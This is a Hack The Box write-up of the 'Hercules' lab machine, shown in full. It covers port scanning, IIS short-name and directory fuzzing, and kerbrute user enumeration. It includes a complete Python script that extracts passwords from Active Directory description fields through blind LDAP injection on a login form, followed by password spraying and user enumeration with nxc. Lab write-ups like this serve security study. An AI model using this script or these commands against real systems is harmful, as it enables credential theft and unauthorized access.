---
title: Hercules [Insane]
published: false
date: 2025-10-24
tags: [htb, windows, web, kerberos, nxc, smb, ffuf, shortscan, kerbrute, seclists, awk, tee, ldap injection, lfi, bloodhound, dotnet, aspxauth cookie, file upload, dll, AvaloniaILSpy, dnSpy, odt, certipy-ad, responder, bloodyAD, powerview, forcechangepassword, genericall, writedacl, allowedtoact, genericwrite, rusthound-ce, bloodhound-python, getTGT, esc3, rbcd, winrmexec, S4U2self, U2U, S4U2proxy, secretsdump]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/hercules-htb-season9
image: /assets/img/hercules-htb-season9/hercules-htb-season9_banner.png
---

# Hercules HTB Season 9
## Machine information
The root flag can be found in the non-default location, `C:\Users\Admin\Desktop`. <br>
Author: [birkk](https://app.hackthebox.com/users/1527613)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.x.x
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 23:46 EDT
Nmap scan report for 10.129.x.x
Host is up (0.22s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://10.129.x.x/
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-19 03:47:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-19T03:48:29
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.61 seconds
```

Add these to `/etc/hosts`:
```bash
10.129.x.x     hercules.htb dc.hercules.htb
```

From what we get, doing some recon within port `53` seemns not worthed but we got website open on `80` and `443`. <br>
Notice that from the machine we done [DarkZero](https://dudenation.github.io/posts/darkzero-htb-season9/) got port `5985` open from the outside and got port `5986` inside the internal, so now we got `5986` open from the outside. Just some key recognize nothing much :D. <br>
Seeing the icon of this challenge and jump out straight to kerberos as 3 heads dogs :) so need to double check on *clock skew* incase running command not working. <br>
&rarr; So let's jumping so our uncover on port `80` and `443` see if we can found useful infos for exploitation.

### WEB (80,443)
```bash
└─$ whatweb http://hercules.htb/                                                  
http://hercules.htb/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.x.x], Microsoft-IIS[10.0], RedirectLocation[https://hercules.htb/], Title[Document Moved]
https://hercules.htb/ [200 OK] ASP_NET, Bootstrap, Cookies[__RequestVerificationToken], Country[RESERVED][ZZ], Email[info@hercules.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], HttpOnly[__RequestVerificationToken], IP[10.129.x.x], JQuery[3.4.1], Microsoft-IIS[10.0], Script, Title[Hercules Corp], X-Frame-Options[SAMEORIGIN]
```

Checking for `http://hercules.htb/` and got redirected to `https://hercules.htb/`, knowing it use `IIS 10.0`, `JQuery 3.4.1`. <br>
We can quickly check for the `Shortnames on IIS Servers` via [shortscan](https://github.com/bitquark/shortscan).

```bash
└─$ shortscan https://hercules.htb/                                                   
🌀 Shortscan v0.9.2 · an IIS short filename enumeration tool by bitquark

════════════════════════════════════════════════════════════════════════════════
URL: https://hercules.htb/
Running: Microsoft-IIS/10.0
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
WEB~1.CON            WEB.CON?   
PRECOM~1.CON         PRECOM?.CON? 
════════════════════════════════════════════════════════════════════════════════

Finished! Requests: 227; Retries: 0; Sent 43397 bytes; Received 38836 bytes
```

Guessing that there will be `web.config` and `precomplied.config`. <br>
&rarr; Leave these a part and let's go through the website first.

![Hercules Website](/assets/img/hercules-htb-season9/hercules-htb-season9_website.png)

![Hercules Website Testmonials](/assets/img/hercules-htb-season9/hercules-htb-season9_website-testmonials.png)

Scroll down seeing this `Testmonials` part contain 3 clients: `John Doe`, `Maria Garcia` and `Mason Miller`. <br>
Deadling with insane machine from previous season, thinking that chance of bruteforce for these infos we gather around or even need to phising to get inside the internal aswell so every enum is gold mines.

![Hercules Website Message](/assets/img/hercules-htb-season9/hercules-htb-season9_website-message.png)

Found a `Drop Us A Message` section but seems like nothing much to concern.

![Hercules Website Message Send](/assets/img/hercules-htb-season9/hercules-htb-season9_website-message-send.png)

![Hercules Website Message Burpsuite](/assets/img/hercules-htb-season9/hercules-htb-season9_website-message-burpsuite.png)

&rarr; So we going to do some fuzzing to identified potiential directories and files that we got a way to discover more.

```bash
└─$ ffuf -u https://hercules.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc all -ac -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://hercules.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
________________________________________________

login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 2104ms]
content                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 1582ms]
home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 1554ms]
Login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 6443ms]
index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 5986ms]
Content                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 5889ms]
Home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 3209ms]
default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 6548ms]
Default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1541ms]
Index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 7493ms]
con                     [Status: 404, Size: 2958, Words: 506, Lines: 57, Duration: 1947ms]
HOME                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 3123ms]
aux                     [Status: 404, Size: 2958, Words: 506, Lines: 57, Duration: 2674ms]
LOGIN                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 1313ms]
prn                     [Status: 404, Size: 2958, Words: 506, Lines: 57, Duration: 2473ms]
CONTENT                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 1748ms]
Con                     [Status: 404, Size: 2958, Words: 506, Lines: 57, Duration: 3024ms]
index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 3552ms]
:: Progress: [62281/62281] :: Job [1/1] :: 60 req/sec :: Duration: [0:31:34] :: Errors: 1539 ::
```

We notice there is `/login` endpoint, gonna check it out.

![Hercules Website Login](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login.png)

So this login page using `Single Sign-On (SSO)` that enables users to securely authenticate with multiple applications and websites by using just one set of credentials.

![Hercules Website Login Rate-Limiting](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-rate-limiting.png)

If we trying two many attempt and failed and keeping on going.

![Hercules Website Login Rate-Limiting Too Many Requests](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-rate-limiting-too-many-requests.png)

We will get this and need to wait for 30s to try again. <br>
From what we collect seems nothing good so far, we gonna enumerate the users using list from [SecLists](https://github.com/danielmiessler/SecLists) with [xato-net-10-million-usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt) see if we can grab some potiential users.

### Enum users
```bash
└─$ kerbrute userenum -d hercules.htb --dc 10.129.x.x /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 05:34:24 >  Using KDC(s):
2025/10/19 05:34:24 >   10.129.x.x:88

2025/10/19 05:34:25 >  [+] VALID USERNAME:       admin@hercules.htb
2025/10/19 05:35:30 >  [+] VALID USERNAME:       administrator@hercules.htb
2025/10/19 05:35:34 >  [+] VALID USERNAME:       Admin@hercules.htb
2025/10/19 05:44:24 >  [+] VALID USERNAME:       Administrator@hercules.htb
2025/10/19 06:21:49 >  [+] VALID USERNAME:       auditor@hercules.htb
2025/10/19 06:50:19 >  [+] VALID USERNAME:       ADMIN@hercules.htb
2025/10/19 06:50:19 >  [+] VALID USERNAME:       will.s@hercules.htb
```

Here we go, got some users that got valid to our machine. <br>
From this user `will.s@hercules.htb` we can see that there could be a pattern that we can use to create a custome wordlists that putting `<name>.<one letter from a -> z>` which is 26 words, so we gonna use list from [names.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt) and generate the pattern with [awk](https://www.geeksforgeeks.org/linux-unix/awk-command-unixlinux-examples/).

```bash
awk ' /^[[:space:]]*$/ {next} { gsub(/^[ \t]+|[ \t]+$/,""); for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' \ /usr/share/wordlists/seclists/Usernames/Names/names.txt | tee names.withletters.txt > /dev/null
```

- `/^[[:space:]]*$/ {next}`: Skip empty/blank lines.
- `gsub(/^[ \t]+|[ \t]+$/,"")`: Trim leading/trailing spaces/tabs from the line.
- `for(i=97;i<=122;i++) printf "%s.%c\n", $0, i`: Loop ASCII 97..122 (a..z) and print `name.<letter>` for each.
- `tee names.withletters.txt > /dev/null`: Write output to names.withletters.txt, tee’s stdout to `/dev/null` so nothing prints to terminal.

&rarr; Now we gonna enum again with our new lists to see if we can grab more users.

```bash
└─$ kerbrute userenum -d hercules.htb --dc 10.129.x.x names.withletters.txt                                                 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/19/25 - Ronnie Flathers @ropnop

2025/10/19 11:16:16 >  Using KDC(s):
2025/10/19 11:16:16 >   10.129.x.x:88

2025/10/19 11:18:53 >  [+] VALID USERNAME:       adriana.i@hercules.htb
2025/10/19 11:26:10 >  [+] VALID USERNAME:       angelo.o@hercules.htb
2025/10/19 11:32:35 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2025/10/19 11:44:04 >  [+] VALID USERNAME:       bob.w@hercules.htb
2025/10/19 11:50:57 >  [+] VALID USERNAME:       camilla.b@hercules.htb
2025/10/19 12:00:16 >  [+] VALID USERNAME:       clarissa.c@hercules.htb
2025/10/19 12:12:30 >  [+] VALID USERNAME:       elijah.m@hercules.htb
2025/10/19 12:18:32 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2025/10/19 12:26:30 >  [+] VALID USERNAME:       harris.d@hercules.htb
2025/10/19 12:26:47 >  [+] VALID USERNAME:       heather.s@hercules.htb
2025/10/19 12:32:15 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2025/10/19 12:35:16 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2025/10/19 12:35:43 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2025/10/19 12:36:45 >  [+] VALID USERNAME:       joel.c@hercules.htb
2025/10/19 12:36:57 >  [+] VALID USERNAME:       johanna.f@hercules.htb
2025/10/19 12:37:01 >  [+] VALID USERNAME:       johnathan.j@hercules.htb
2025/10/19 12:42:48 >  [+] VALID USERNAME:       ken.w@hercules.htb
2025/10/19 12:58:00 >  [+] VALID USERNAME:       mark.s@hercules.htb
2025/10/19 13:02:18 >  [+] VALID USERNAME:       mikayla.a@hercules.htb
2025/10/19 13:07:00 >  [+] VALID USERNAME:       natalie.a@hercules.htb
2025/10/19 13:07:07 >  [+] VALID USERNAME:       nate.h@hercules.htb
2025/10/19 13:12:34 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2025/10/19 13:19:01 >  [+] VALID USERNAME:       ramona.l@hercules.htb
2025/10/19 13:20:27 >  [+] VALID USERNAME:       ray.n@hercules.htb
2025/10/19 13:22:20 >  [+] VALID USERNAME:       rene.s@hercules.htb
2025/10/19 13:28:53 >  [+] VALID USERNAME:       shae.j@hercules.htb
2025/10/19 13:33:28 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2025/10/19 13:33:29 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2025/10/19 13:35:45 >  [+] VALID USERNAME:       tanya.r@hercules.htb
2025/10/19 13:38:20 >  [+] VALID USERNAME:       tish.c@hercules.htb
2025/10/19 13:41:56 >  [+] VALID USERNAME:       vincent.g@hercules.htb
2025/10/19 13:43:45 >  [+] VALID USERNAME:       will.s@hercules.htb
2025/10/19 13:46:54 >  [+] VALID USERNAME:       zeke.s@hercules.htb
2025/10/19 13:47:33 >  Done! Tested 264602 usernames (33 valid) in 9077.013 seconds
```

So we got 33 more users and add these up to 1 file.

```bash
└─$ cat hercules_users.txt
auditor
administrator
admin
adriana.i
angelo.o
ashley.b
bob.w
camilla.b
clarissa.c
elijah.m
fiona.c
harris.d
heather.s
jacob.b
jennifer.a
jessica.e
joel.c
johanna.f
johnathan.j
ken.w
mark.s
mikayla.a
natalie.a
nate.h
patrick.s
ramona.l
ray.n
rene.s
shae.j
stephanie.w
stephen.m
tanya.r
tish.c
vincent.g
will.s
winda.s
zeke.s
```

Now we got some creds to dealing with but the problem is no password are found for these creds. <br>
&rarr; Head back to `/Login` endpoint see if we can do something more.

### LDAP Injection
So when we enter creds that is not the valid one and not the correct pattern.

![Hercules Website Login Invalid](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-invalid.png)

We will get `Invalid login attempt` but when trying with some valid creds we found.

![Hercules Website Login Valid](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-valid.png)

Seeing `Login attempt failed` meaning that `will.s` is valid one. <br>
&rarr; Thinking of `LDAP injection` is a good choice for this one. Searching for ideas from `0xdf` and got [ldap-injection-password-brute-force](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html#ldap-injection-password-brute-force) which he did in the [htb-ghost](https://0xdf.gitlab.io/2025/04/05/htb-ghost.html) machine.

But when we doing trying some testcase from what we read into our machine, we did not get the response as expect.

![Hercules Website Login Burpsuite](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-burpsuite.png)

Notice that there is some regex to filter out.

```html
<input class="form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />
```

And also a token following as well.

```http
__RequestVerificationToken=tmKRbLLXD77TiMxvQ9yXIdJo0rLDbKE4jgaiPHq_C80Vrus5NCIZDN6yNu0Y70PprfgyyfGHYyov9W6cfGy8bZcN9E_852L3uEschi9sRm81
```

So thinking of query like `(&(username=*))` which will return results thus valid. <br>
If we do like this `username=a*` to check it valid or not, and if valid then testing more like `aa*`, `ab*` until we get all the usernames.

> *Be sure to URL encoded twice to see the different.*

![Hercules Website Login Burpsuite Valid](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-burpsuite-valid.png)

Trying with `username=a*` and got `Login attempt failed` meaning there is user name with `a`, so check the next one if it was another `a` or not.

![Hercules Website Login Burpsuite Invalid](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-burpsuite-invalid.png)

We got `Invalid login attempt` meaning that there is not user name `aa` so it is not valid. <br>
But we can not keep doing this all the way until we get the valid user we need. <br>
&rarr; As we always have a list of username so we gonna deadling with the password one.

The query will be like `(&(username=will.s)(description=*))` and payload we enter `will.s)(description=*` so that if the user has description set will be valid. <br>
&rarr; Let's try with `a*` to see.

![Hercules Website Login Burpsuite Invalid Password](/assets/img/hercules-htb-season9/hercules-htb-season9_website-login-burpsuite-invalid-password.png)

`Invalid login attempt` meaning that the first char of the password is not `a`. <br>
&rarr; To keep these things automate, we will create script to bruteforce to get the password suitable with the valid users we got.

```py
import requests
import string
import urllib3
import re
import time
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False

SUCCESS_INDICATOR = "Login attempt failed"

TOKEN_RE = re.compile(
    r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"',
    re.IGNORECASE
)

def get_token_and_cookie(session):
    try:
        response = session.get(BASE + "/login", verify=VERIFY_TLS, timeout=10)
        
        token = None
        match = TOKEN_RE.search(response.text)
        if match:
            token = match.group(1)
        
        return token
    except Exception as e:
        print(f"[!] Error getting token: {e}")
        return None

def test_ldap_injection(username, description_prefix=""):
    session = requests.Session()
    
    token = get_token_and_cookie(session)
    if not token:
        return False
    
    if description_prefix:
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')
        if '\\' in escaped_desc and '\\2' not in escaped_desc:
            escaped_desc = escaped_desc.replace('\\', '\\5c')
        
        payload = f"{username}*)(description={escaped_desc}*"
    else:
        payload = f"{username}*)(description=*"
    
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
    
    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }
    
    try:
        response = session.post(
            TARGET_URL,
            data=data,
            verify=VERIFY_TLS,
            timeout=10
        )
        
        # Success: LDAP filter matched → "Login attempt failed"
        # Failure: LDAP filter didn't match → "Invalid Username"
        return SUCCESS_INDICATOR in response.text
        
    except Exception as e:
        print(f"[!] Request error: {e}")
        return False

def enumerate_description(username):
    
    charset = (
        string.ascii_lowercase +        # a-z
        string.digits +                 # 0-9
        string.ascii_uppercase +        # A-Z
        "!@#$_*-." +                   # Common special chars
        "%^&()=+[]{}|;:',<>?/`~\" \\"  # Less common
    )
    
    print(f"\n[*] Checking user: {username}")
    
    if not test_ldap_injection(username):
        print(f"[-] User {username} has no description field")
        return None
    
    print(f"[+] User {username} has a description field, enumerating...")
    
    description = ""
    max_length = 50
    no_char_count = 0
    
    for position in range(max_length):
        found = False
        
        for char in charset:
            test_desc = description + char
            
            if test_ldap_injection(username, test_desc):
                description += char
                print(f"    Position {position}: '{char}' -> Current: {description}")
                found = True
                no_char_count = 0
                break
            
            time.sleep(0.01)
        
        if not found:
            no_char_count += 1
            if no_char_count >= 2:
                break
    
    if description:
        print(f"[+] Complete: {username} => {description}")
        return description
    
    return None

def read_usernames(filepath):
    try:
        with open(filepath, 'r') as f:
            usernames = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return usernames
    except FileNotFoundError:
        print(f"[!] File not found: {filepath}")
        return []
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        return []

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Hercules LDAP Injection'
    )
    parser.add_argument('-u', '--userfile',
                       help='File containing usernames (one per line)')
    parser.add_argument('--user',
                       help='Single username to test')
    parser.add_argument('-t', '--target',
                       default='https://hercules.htb',
                       help='Target URL (default: https://hercules.htb)')
    parser.add_argument('-o', '--output',
                       default='hercules_passwords.txt',
                       help='Output file (default: hercules_passwords.txt)')
    
    args = parser.parse_args()
    
    if args.user:
        usernames = [args.user]
    elif args.userfile:
        usernames = read_usernames(args.userfile)
        if not usernames:
            print("[!] No usernames to test!")
            return
    else:
        usernames = [
            "auditor",
            "administrator",
            "admin",
        ]
        print("[*] No userfile specified, using default priority users")
    
    global BASE, TARGET_URL
    BASE = args.target
    TARGET_URL = BASE + LOGIN_PATH
    
    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Target: {args.target}")
    print(f"Testing {len(usernames)} users")
    print("="*60)
    
    found_passwords = {}
    
    for user in usernames:
        password = enumerate_description(user)
        
        if password:
            found_passwords[user] = password
            
            with open(args.output, "a") as f:
                f.write(f"{user}:{password}\n")
            
            print(f"\n[+] FOUND: {user}:{password}\n")
    
    print("\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)
    
    if found_passwords:
        print(f"\nFound {len(found_passwords)} passwords:")
        for user, pwd in found_passwords.items():
            print(f"  {user}: {pwd}")
        print(f"\n[+] Results saved to: {args.output}")
    else:
        print("\nNo passwords found")

if __name__ == "__main__":
    main()
```

Let's run the script again `hercules_users.txt`.

```bash
─$ python3 hercules_ldap_enum.py -u hercules_users.txt 
============================================================
Hercules LDAP Description/Password Enumeration
Target: https://hercules.htb
Testing 36 users
============================================================

[*] Checking user: auditor
[-] User auditor has no description field

<SNIP>

[*] Checking user: johnathan.j
[+] User johnathan.j has a description field, enumerating...
    Position 0: 'c' -> Current: c
    Position 1: 'h' -> Current: ch
    Position 2: 'a' -> Current: cha
    Position 3: 'n' -> Current: chan
    Position 4: 'g' -> Current: chang
    Position 5: 'e' -> Current: change
    Position 6: '*' -> Current: change*
    Position 7: 't' -> Current: change*t
    Position 8: 'h' -> Current: change*th
    Position 9: '1' -> Current: change*th1
    Position 10: 's' -> Current: change*th1s
    Position 11: '_' -> Current: change*th1s_
    Position 12: 'p' -> Current: change*th1s_p
    Position 13: '@' -> Current: change*th1s_p@
    Position 14: 's' -> Current: change*th1s_p@s
    Position 15: 's' -> Current: change*th1s_p@ss
    Position 16: 'w' -> Current: change*th1s_p@ssw
    Position 17: '(' -> Current: change*th1s_p@ssw(
    Position 18: ')' -> Current: change*th1s_p@ssw()
    Position 19: 'r' -> Current: change*th1s_p@ssw()r
    Position 20: 'd' -> Current: change*th1s_p@ssw()rd
    Position 21: '!' -> Current: change*th1s_p@ssw()rd!
    Position 22: '!' -> Current: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!

[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!

<SNIP>

============================================================
ENUMERATION COMPLETE
============================================================

Found 1 passwords:
  johnathan.j: change*th1s_p@ssw()rd!!

[+] Results saved to: hercules_passwords.txt
```

Got 1 password match with `johnathan.j`. <br>
&rarr; `johnathan.j:change*th1s_p@ssw()rd!!`.

The key differents from `Ghost Script Pattern` and what we adapted to our `Hercules` machine.

- *Ghost Script Pattern:*

```py
username = sys.argv[1] if len(sys.argv) > 1 else "gitea_temp_principal"
password = ""
while True:
    for c in string.printable[:-5]:
        print(f"\rPassword for {username}: {password}{c}", end="")
        files = {"1_ldap-secret": (None, f"{password}{c}*")}
        resp = requests.post(url, headers=headers, files=files)
        if resp.status_code == 303:
            password += c
            break
```

- *Hercules adapted:*

```py
userfile = sys.argv[1] if len(sys.argv) > 1 else "hercules_users.txt"
users = [line.strip() for line in open(userfile)]
for username in users:
    password = ""
    while True:
        for c in string.printable[:-5]:
            print(f"\rPassword for {username}: {password}{c}", end="")
            payload = f"{username}*)(description={password}{c}*"
            encoded = ''.join(f'%{byte:02X}' for byte in payload.encode())
            resp = requests.post(url, data=data, verify=False)
            if "Login attempt failed" in resp.text:
                password += c
                break
```

- Ghost uses **`files`** multipart while Hercules uses **`data`** form.
- Ghost checks **`status_code == 303`** while Hercules checks text content.
- Hercules needs double URL encoding while Ghost doesn't.
- Hercules injects in username field while Ghost in secret field.

```bash
└─$ cat hercules_passwords.txt 
johnathan.j:change*th1s_p@ssw()rd!!
```

Now we will double check to ensure that creds is match.

```bash
└─$ nxc smb dc.hercules.htb -u hercules_users.txt -p 'change*th1s_p@ssw()rd!!' -k --continue-on-success 
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
<SNIP>
SMB         dc.hercules.htb 445    dc               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED 
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
```

Somehow we got failed on `johnathan.j` but valid with `ken.w` :D. <br>
&rarr; Then we will use this valid one to enum users on the machine.

```bash
└─$ nxc smb dc.hercules.htb -u 'ken.w' -p 'change*th1s_p@ssw()rd!!' -k --users      
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc.hercules.htb 445    dc               Administrator                 2025-10-17 10:49:44 1       Built-in account for administering the computer/domain 
SMB         dc.hercules.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc.hercules.htb 445    dc               krbtgt                        2024-12-04 01:39:35 0       Key Distribution Center Service Account 
SMB         dc.hercules.htb 445    dc               taylor.m                      2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               fernando.r                    2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               james.s                       2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               anthony.r                     2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               iis_webserver$                2024-12-04 01:44:43 0        
SMB         dc.hercules.htb 445    dc               iis_hadesapppool$             2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               iis_apppoolidentity$          2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               iis_defaultapppool$           2024-12-04 01:44:44 0        
SMB         dc.hercules.htb 445    dc               auditor                       2024-12-04 01:44:44 1        
SMB         dc.hercules.htb 445    dc               vincent.g                     2024-12-04 01:44:45 0        
SMB         dc.hercules.htb 445    dc               nate.h                        2024-12-04 01:44:45 0        
SMB         dc.hercules.htb 445    dc               stephen.m                     2024-12-04 01:44:45 0        
SMB         dc.hercules.htb 445    dc               mark.s                        2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               elijah.m                      2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               angelo.o                      2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               ashley.b                      2024-12-04 01:44:46 0        
SMB         dc.hercules.htb 445    dc               clarissa.c                    2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               winda.s                       2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               rene.s                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               will.s                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               zeke.s                        2024-12-04 01:44:47 0        
